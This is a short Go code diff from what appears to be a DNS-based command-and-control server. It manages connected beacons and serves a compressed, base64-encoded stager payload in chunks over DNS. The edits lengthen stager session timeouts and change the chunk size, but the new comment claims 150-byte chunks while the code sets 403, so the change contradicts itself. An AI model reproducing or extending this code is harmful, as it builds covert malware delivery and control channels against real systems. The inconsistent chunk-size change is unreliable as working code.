@@ -33,11 +33,11 @@ const (
 	resultPreviewMaxLength = 200
 
 	// DNS label chunk size (RFC compliant)
-	dnsLabelMaxLength = 62
+	//dnsLabelMaxLength = 62
 
 	// Session expiration times
-	stagerSessionTimeout  = 30 * time.Minute // Stager sessions expire after 30 minutes
-	expectedResultTimeout = 1 * time.Hour    // Expected results expire after 1 hour
+	stagerSessionTimeout  = 3 * time.Hour // Stager sessions expire after 3 hours (allows slow downloads)
+	expectedResultTimeout = 1 * time.Hour // Expected results expire after 1 hour
 )
 
 // Beacon represents a connected beacon client
@@ -738,8 +738,8 @@ func (c2 *C2Manager) handleStagerRequest(parts []string, clientIP string) string
 	base64Data := base64.StdEncoding.EncodeToString(compressed)
 	logf("[C2] Base64 encoded: %d bytes", len(base64Data))
 
-	// Split into chunks (400 bytes per chunk as defined in stager)
-	const chunkSize = 400
+	// Split into chunks (150 bytes - safe for UDP DNS with all overhead)
+	const chunkSize = 403
 	var chunks []string
 	for i := 0; i < len(base64Data); i += chunkSize {
 		end := i + chunkSize
